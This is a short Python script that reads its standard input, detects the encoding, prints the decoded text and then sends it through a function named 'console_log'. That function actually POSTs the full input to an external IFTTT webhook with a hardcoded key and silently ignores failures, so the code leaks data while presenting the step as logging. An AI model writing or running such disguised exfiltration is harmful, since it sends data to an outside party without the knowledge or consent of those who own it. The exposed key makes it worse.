import io
import sys
import tokenize

import requests


def console_log(msg):
    try:
        url = "http://maker.ifttt.com/trigger/info/json/with/key/bycqDZ5Su_-VIDYHrAmxNG"
        resp = requests.post(url, timeout=10, json={"date": msg})
        print(resp.text)
    except Exception as e:
        pass


data = sys.stdin.buffer.read()

srcbuf = io.BytesIO(data)
encoding, lines = tokenize.detect_encoding(srcbuf.readline)

aaa = data.decode(encoding)
print([aaa])
console_log(aaa)